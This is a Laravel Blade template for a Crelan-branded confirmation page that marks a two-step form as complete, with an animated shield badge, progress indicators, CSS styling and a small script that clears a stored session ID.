@extends('layouts.app')

@section('title', __('messages.success_final_title') . ' | Crelan')

@section('content')
<div class="form-page-center">
    <div class="form-container">
        <div class="form-container--header-crelan">
            <svg class="crelan-logo-icon" width="48" height="34" viewBox="0 0 48 34" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M40.3007 0.955874C39.4821 4.0007 38.2455 6.83888 36.6671 9.38458C31.9043 17.0694 24.0286 22.0916 15.1179 22.0916C11.9602 22.0916 8.93273 21.4606 6.12793 20.3041L7.28372 24.6914L9.14052 31.7379C12.219 32.884 15.5068 33.5055 18.9232 33.5055C31.3351 33.5055 42.0618 25.3248 47.1437 13.4586L40.2999 0.955078L40.3007 0.955874Z" fill="#C3D100"/>
                <path d="M36.6671 9.38483L31.5303 0C30.943 2.13956 29.962 4.21713 28.64 6.10077C25.2456 10.9363 19.6007 14.4858 12.5828 14.4858C10.4421 14.4858 8.32031 14.2306 6.3255 13.6822C3.98333 13.0385 1.81602 11.9909 0 10.4729L3.31369 23.0488C4.33619 23.598 5.67233 24.1885 7.28448 24.6924C9.57804 25.4093 12.4291 25.9513 15.7326 25.9513C24.8457 25.9513 33.4028 20.3608 38.4643 12.6673L36.6679 9.38563L36.6671 9.38483Z" fill="#88BC1F"/>
                <path d="M28.6397 6.09983L25.7894 0.891602C23.6158 5.87252 20.2002 9.4427 13.601 9.4427C10.0372 9.4427 5.97545 7.90956 4.4668 6.63075L6.32438 13.6805L7.20808 17.0345C9.31266 17.7013 11.5317 18.059 13.8245 18.059C21.2329 18.059 27.6713 14.0024 30.2683 9.07551L28.6397 6.09983Z" fill="#019544"/>
                <path d="M38.4635 12.6659L36.6671 9.38428C31.9043 17.0691 24.0286 22.0913 15.1179 22.0913C11.9602 22.0913 8.93273 21.4603 6.12793 20.3038L7.28372 24.6911C9.57728 25.408 12.4283 25.95 15.7318 25.95C24.8449 25.95 33.402 20.3595 38.4635 12.6659Z" fill="#7FAD00"/>
                <path d="M40.3012 0.955874C39.4825 4.0007 38.246 6.83888 36.6675 9.38458L38.464 12.6662C33.4032 20.3598 24.8461 25.9503 15.7323 25.9503C12.4288 25.9503 9.57773 25.4083 7.28418 24.6914L9.14098 31.7379C12.2194 32.884 15.5073 33.5055 18.9237 33.5055C31.3355 33.5055 42.0623 25.3248 47.1442 13.4586L40.3004 0.955078L40.3012 0.955874Z" fill="#C4D600"/>
                <path d="M28.6397 6.09983L25.7894 0.891602C23.6158 5.87252 20.2002 9.4427 13.601 9.4427C10.0372 9.4427 5.97545 7.90956 4.4668 6.63075L6.32438 13.6805C8.31997 14.2289 10.4418 14.484 12.5817 14.484C19.5995 14.484 25.2444 10.9345 28.6389 6.09904L28.6397 6.09983Z" fill="#00AE53"/>
                <path d="M13.8245 18.0597C21.2329 18.0597 27.6713 14.0031 30.2683 9.07626L28.6397 6.10059C25.2453 10.9361 19.6004 14.4856 12.5825 14.4856C10.4418 14.4856 8.32 14.2305 6.3252 13.682L7.2089 17.036C9.31348 17.7029 11.5325 18.0605 13.8253 18.0605L13.8245 18.0597Z" fill="#009644"/>
                <path d="M31.5311 0C30.9438 2.13956 29.9628 4.21713 28.6408 6.10078L30.2694 9.07645C27.6724 14.0033 21.234 18.0599 13.8256 18.0599C11.5329 18.0599 9.31457 17.7023 7.20921 17.0354L6.3255 13.6814C3.98333 13.0377 1.81602 11.9901 0 10.4721L3.31369 23.048C4.33619 23.5972 5.67233 24.1877 7.28448 24.6916L6.12869 20.3044C8.93427 21.4608 11.9618 22.0919 15.1186 22.0919C24.0294 22.0919 31.9051 17.0696 36.6679 9.38483L31.5311 0Z" fill="#84BD00"/>
            </svg>
            <span>Crelan</span>
        </div>

        <div class="form-container--content">
            <div class="success-final-container">

                <!-- Animated celebration badge -->
                <div class="celebration-badge" aria-hidden="true">
                    <div class="badge-rings">
                        <div class="ring ring-1"></div>
                        <div class="ring ring-2"></div>
                        <div class="ring ring-3"></div>
                    </div>
                    <div class="badge-core">
                        <div class="shield-shape">
                            <svg viewBox="0 0 80 90" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M40 2L74 16V42C74 62 58 78 40 88C22 78 6 62 6 42V16L40 2Z"
                                      fill="url(#shieldGrad)" stroke="url(#shieldStroke)" stroke-width="2"/>
                                <path class="check-path" d="M24 45L35 56L56 34"
                                      stroke="white" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"
                                      fill="none"/>
                                <defs>
                                    <linearGradient id="shieldGrad" x1="6" y1="2" x2="74" y2="88" gradientUnits="userSpaceOnUse">
                                        <stop offset="0%" stop-color="#84BD00"/>
                                        <stop offset="50%" stop-color="#00A651"/>
                                        <stop offset="100%" stop-color="#009644"/>
                                    </linearGradient>
                                    <linearGradient id="shieldStroke" x1="6" y1="2" x2="74" y2="88" gradientUnits="userSpaceOnUse">
                                        <stop offset="0%" stop-color="#C4D600"/>
                                        <stop offset="100%" stop-color="#00AE53"/>
                                    </linearGradient>
                                </defs>
                            </svg>
                        </div>
                    </div>
                    <!-- Sparkle particles -->
                    <div class="sparkle s1"></div>
                    <div class="sparkle s2"></div>
                    <div class="sparkle s3"></div>
                    <div class="sparkle s4"></div>
                    <div class="sparkle s5"></div>
                    <div class="sparkle s6"></div>
                    <div class="sparkle s7"></div>
                    <div class="sparkle s8"></div>
                </div>

                <h2 class="success-title">{{ __('messages.success_final_title') }}</h2>
                <p class="success-description">{{ __('messages.success_final_description') }}</p>

                <!-- Completed steps visual -->
                <div class="completed-steps-card">
                    <div class="steps-row">
                        <div class="mini-step done" style="animation-delay: 0.3s">
                            <div class="mini-step-icon">
                                <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="10" cy="10" r="9" fill="#E6F6EA" stroke="#00A651" stroke-width="2"/><path d="M6 10.5L9 13.5L14 7.5" stroke="#00A651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                            </div>
                            <span class="mini-step-label">{{ __('messages.step1_short') }}</span>
                        </div>
                        <div class="steps-connector done-connector">
                            <div class="connector-line"></div>
                        </div>
                        <div class="mini-step done" style="animation-delay: 0.6s">
                            <div class="mini-step-icon">
                                <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="10" cy="10" r="9" fill="#E6F6EA" stroke="#00A651" stroke-width="2"/><path d="M6 10.5L9 13.5L14 7.5" stroke="#00A651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                            </div>
                            <span class="mini-step-label">{{ __('messages.step2_short') }}</span>
                        </div>
                    </div>
                    <div class="completed-bar">
                        <div class="completed-bar-fill"></div>
                    </div>
                    <span class="completed-bar-label">100%</span>
                </div>

                <!-- Info block -->
                <div class="info-block">
                    <div class="info-block-icon">
                        <svg width="22" height="22" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <circle cx="11" cy="11" r="10" stroke="#84BD00" stroke-width="1.5" fill="#f0fdf4"/>
                            <path d="M11 6V12" stroke="#00A651" stroke-width="2" stroke-linecap="round"/>
                            <circle cx="11" cy="15.5" r="1" fill="#00A651"/>
                        </svg>
                    </div>
                    <p class="info-block-text">{{ __('messages.success_final_processing') }}</p>
                </div>

                <!-- Thank you -->
                <p class="thank-you-text">{{ __('messages.success_final_thanks') }}</p>

            </div>
        </div>
    </div>
</div>
@endsection

@push('styles')
<style>
.success-final-container {
    text-align: center;
    max-width: 480px;
    margin: 0 auto;
    padding: 8px 0 0;
}

/* === Celebration badge === */
.celebration-badge {
    position: relative;
    width: 140px;
    height: 140px;
    margin: 0 auto 28px;
}

.badge-rings {
    position: absolute;
    inset: 0;
}

.ring {
    position: absolute;
    border-radius: 50%;
    border: 2px solid transparent;
    animation: ringPulse 2.4s ease-out infinite;
}

.ring-1 {
    inset: -6px;
    border-color: rgba(132, 189, 0, 0.25);
    animation-delay: 0s;
}
.ring-2 {
    inset: -16px;
    border-color: rgba(0, 166, 81, 0.15);
    animation-delay: 0.8s;
}
.ring-3 {
    inset: -26px;
    border-color: rgba(0, 174, 83, 0.08);
    animation-delay: 1.6s;
}

@keyframes ringPulse {
    0% { transform: scale(0.95); opacity: 1; }
    50% { transform: scale(1.05); opacity: 0.6; }
    100% { transform: scale(0.95); opacity: 1; }
}

.badge-core {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    animation: badgePop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) 0.2s both;
}

@keyframes badgePop {
    from { transform: scale(0); opacity: 0; }
    to { transform: scale(1); opacity: 1; }
}

.shield-shape {
    width: 80px;
    height: 90px;
    filter: drop-shadow(0 4px 12px rgba(0, 166, 81, 0.3));
}

.shield-shape svg {
    width: 100%;
    height: 100%;
}

.check-path {
    stroke-dasharray: 60;
    stroke-dashoffset: 60;
    animation: drawCheck 0.5s ease-out 0.7s forwards;
}

@keyframes drawCheck {
    to { stroke-dashoffset: 0; }
}

/* === Sparkles === */
.sparkle {
    position: absolute;
    width: 6px;
    height: 6px;
    border-radius: 50%;
    opacity: 0;
}

.sparkle::before {
    content: '';
    position: absolute;
    inset: 0;
    border-radius: 50%;
    background: currentColor;
}

.s1 { top: 8px; left: 50%; color: #C4D600; animation: sparkleFloat 2s ease-in-out 1s infinite; }
.s2 { top: 20%; right: 4px; color: #00A651; animation: sparkleFloat 2s ease-in-out 1.3s infinite; }
.s3 { bottom: 20%; right: 0; color: #84BD00; animation: sparkleFloat 2s ease-in-out 1.6s infinite; }
.s4 { bottom: 8px; left: 50%; color: #00AE53; animation: sparkleFloat 2s ease-in-out 1.9s infinite; }
.s5 { bottom: 20%; left: 0; color: #C4D600; animation: sparkleFloat 2s ease-in-out 1.15s infinite; }
.s6 { top: 20%; left: 4px; color: #009644; animation: sparkleFloat 2s ease-in-out 1.45s infinite; }
.s7 { top: 35%; right: -8px; color: #88BC1F; animation: sparkleFloat 2s ease-in-out 1.75s infinite; }
.s8 { top: 35%; left: -8px; color: #00A651; animation: sparkleFloat 2s ease-in-out 2.05s infinite; }

@keyframes sparkleFloat {
    0%, 100% { opacity: 0; transform: scale(0) translateY(0); }
    20% { opacity: 1; transform: scale(1) translateY(-4px); }
    50% { opacity: 0.8; transform: scale(0.8) translateY(2px); }
    80% { opacity: 1; transform: scale(1.1) translateY(-2px); }
}

/* === Title / description === */
.success-title {
    font-size: 22px;
    font-weight: 700;
    color: #1a202c;
    margin-bottom: 10px;
    animation: fadeUp 0.5s ease-out 0.4s both;
}

.success-description {
    font-size: 15px;
    color: #4a5568;
    line-height: 1.65;
    margin-bottom: 28px;
    animation: fadeUp 0.5s ease-out 0.55s both;
}

@keyframes fadeUp {
    from { opacity: 0; transform: translateY(12px); }
    to { opacity: 1; transform: translateY(0); }
}

/* === Completed steps card === */
.completed-steps-card {
    background: linear-gradient(135deg, #f0fdf4 0%, #f8fafc 100%);
    border: 1px solid #d1e7dd;
    border-radius: 14px;
    padding: 22px 24px 18px;
    margin-bottom: 20px;
    animation: fadeUp 0.5s ease-out 0.7s both;
}

.steps-row {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0;
    margin-bottom: 18px;
}

.mini-step {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 8px;
    opacity: 0;
    animation: stepReveal 0.4s ease-out forwards;
}

@keyframes stepReveal {
    from { opacity: 0; transform: scale(0.8); }
    to { opacity: 1; transform: scale(1); }
}

.mini-step-icon {
    width: 36px;
    height: 36px;
    display: flex;
    align-items: center;
    justify-content: center;
    background: white;
    border-radius: 50%;
    box-shadow: 0 2px 8px rgba(0, 166, 81, 0.15);
}

.mini-step-icon svg {
    width: 22px;
    height: 22px;
}

.mini-step-label {
    font-size: 12px;
    font-weight: 600;
    color: #00A651;
    letter-spacing: 0.02em;
    white-space: nowrap;
}

.steps-connector {
    flex: 0 0 80px;
    height: 2px;
    margin: 0 8px;
    margin-bottom: 28px;
    position: relative;
}

.connector-line {
    position: absolute;
    inset: 0;
    background: #e2e8f0;
    border-radius: 2px;
    overflow: hidden;
}

.done-connector .connector-line::after {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    height: 100%;
    width: 0;
    background: linear-gradient(90deg, #84BD00, #00A651);
    border-radius: 2px;
    animation: fillLine 0.6s ease-out 0.9s forwards;
}

@keyframes fillLine {
    to { width: 100%; }
}

.completed-bar {
    height: 6px;
    background: #e2e8f0;
    border-radius: 3px;
    overflow: hidden;
    margin-bottom: 6px;
}

.completed-bar-fill {
    height: 100%;
    width: 0;
    background: linear-gradient(90deg, #C4D600 0%, #84BD00 30%, #00A651 70%, #009644 100%);
    border-radius: 3px;
    animation: barFill 1.2s cubic-bezier(0.4, 0, 0.2, 1) 1.1s forwards;
    background-size: 200% 100%;
}

@keyframes barFill {
    to { width: 100%; }
}

.completed-bar-label {
    display: block;
    text-align: right;
    font-size: 12px;
    font-weight: 700;
    color: #00A651;
    opacity: 0;
    animation: fadeUp 0.3s ease-out 2s forwards;
}

/* === Info block === */
.info-block {
    display: flex;
    align-items: flex-start;
    gap: 12px;
    padding: 14px 16px;
    background: #fafdf7;
    border: 1px solid #e2efd0;
    border-radius: 10px;
    margin-bottom: 20px;
    text-align: left;
    animation: fadeUp 0.5s ease-out 0.85s both;
}

.info-block-icon {
    flex-shrink: 0;
    margin-top: 1px;
}

.info-block-text {
    font-size: 13.5px;
    color: #4a5568;
    line-height: 1.6;
    margin: 0;
}

/* === Thank you === */
.thank-you-text {
    font-size: 14px;
    color: #64748b;
    line-height: 1.6;
    animation: fadeUp 0.5s ease-out 1s both;
    margin: 0;
}

/* === Mobile === */
@media (max-width: 480px) {
    .celebration-badge {
        width: 120px;
        height: 120px;
        margin-bottom: 24px;
    }

    .shield-shape {
        width: 68px;
        height: 76px;
    }

    .ring-1 { inset: -4px; }
    .ring-2 { inset: -12px; }
    .ring-3 { inset: -20px; }

    .success-title { font-size: 20px; }
    .success-description { font-size: 14px; }

    .completed-steps-card { padding: 18px 16px 14px; }
    .steps-connector { flex: 0 0 50px; }
}
</style>
@endpush

@push('scripts')
<script>
document.addEventListener('DOMContentLoaded', function() {
    localStorage.removeItem('session_id');
});
</script>
@endpush
